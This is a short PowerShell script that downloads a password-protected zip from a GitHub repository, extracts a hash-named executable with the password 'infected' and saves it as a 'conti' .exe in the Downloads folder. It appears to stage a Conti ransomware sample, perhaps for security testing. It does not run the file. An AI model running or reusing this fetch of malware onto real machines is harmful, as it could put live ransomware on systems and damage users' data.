$downloadPath = "$env:USERPROFILE\Downloads"
$outFilePath = "$downloadPath\conti-temp.zip"
$outExePath = "$downloadPath\conti-ebeca2df24a.exe"
$url = "https://github.com/turvas/ps_test/raw/master/conti-pass-ebeca2df24a.zip"
Invoke-WebRequest -Uri $url -OutFile $outFilePath
$exeFile = "ebeca2df24a55c629cf0ce0d4b703ed632819d8ac101b1b930ec666760036124"
& 'C:\Program Files\7-Zip\7z.exe' x $outFilePath $exeFile -o"$downloadPath" -pinfected
mv $downloadPath\$exeFile $outExePath
 

